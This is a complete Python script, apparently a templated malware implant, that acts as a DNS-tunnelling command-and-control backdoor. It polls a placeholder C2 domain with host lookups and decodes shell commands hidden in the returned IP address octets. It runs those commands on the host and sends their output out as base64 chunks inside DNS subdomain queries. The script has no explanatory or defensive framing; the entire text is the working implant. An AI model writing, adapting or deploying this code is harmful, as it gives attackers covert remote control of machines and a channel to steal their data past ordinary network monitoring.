import subprocess,base64,time,os
D='__C2_DOMAIN_PLACEHOLDER__'
S='__SESSION_ID_PLACEHOLDER__'
P=int(os.environ.get('POLL_INTERVAL','3'))
L=60
def q(n):
 try:
  r=subprocess.run(['getent','hosts',n],capture_output=True,text=True,timeout=5)
  if r.returncode==0 and r.stdout.strip():return r.stdout.split()[0]
 except:pass
def poll(s,c):
 r=q(f"cmd.{c}.{s}.{D}")
 if not r or r=="127.0.0.1":return
 if r=="192.168.0.1":return"EXIT"
 b=""
 for i in range(50):
  r=q(f"c{i}.{s}.{D}")
  if not r:break
  o=r.split('.')
  if len(o)!=4:break
  for j in range(1,4):
   v=int(o[j])
   if v>0:b+=chr(v)
  if o[0]=='11':break
 if b:
  try:return base64.b64decode(b).decode()
  except:pass
def run(c):
 try:
  r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
  return(r.stdout+r.stderr)or"(empty)"
 except:return"error"
def exfil(s,d,c):
 e=base64.b64encode(d.encode()).decode().replace('=','-')or'ZZEmpty'
 chunks=[e[i:i+L]for i in range(0,len(e),L)]
 t=len(chunks)
 for i,ch in enumerate(chunks):
  ts=int(time.time()*1000)%10000
  q(f"{c}.{i+1}.{t}.{ts}.{ch}.{c}.{s}.{D}")
  time.sleep(0.05)
n=0;last=None
while 1:
 try:
  n+=1;cmd=poll(S,n)
  if cmd:
   if cmd==last:time.sleep(P);continue
   if cmd.lower()=='exit':break
   out=run(cmd);time.sleep(0.5);exfil(S,out,n);last=cmd
  time.sleep(P)
 except KeyboardInterrupt:break
 except:time.sleep(P)
